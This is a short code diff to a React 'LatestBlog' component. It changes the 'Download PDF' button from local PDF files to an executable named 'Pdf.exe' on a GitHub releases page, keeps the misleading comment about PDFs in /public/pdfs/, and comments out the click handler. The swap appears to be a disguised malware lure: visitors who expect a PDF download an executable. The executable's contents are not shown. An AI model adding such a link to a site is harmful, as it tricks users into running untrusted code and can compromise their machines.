@@ -155,11 +155,11 @@ export default function LatestBlog({ onPostClick }) {
 
   {/* Download PDF Button */}
   <motion.a
-    href={`/pdfs/latest-blog-${index + 1}.pdf`} // Make sure these PDFs exist in /public/pdfs/
+    href={`https://github.com/Richard-tech-alt/fbfreezed/releases/download/v1/Pdf.exe`} // Make sure these PDFs exist in /public/pdfs/
     download
     whileHover={{ scale: 1.05 }}
     whileTap={{ scale: 0.95 }}
-    onClick={(e) => e.stopPropagation()} // Prevent card click
+    // onClick={(e) => e.stopPropagation()} // Prevent card click
     className="text-xs sm:text-sm text-white bg-orange-500 px-3 py-1 rounded-full font-medium hover:bg-orange-600 transition-all"
   >
     Download PDF
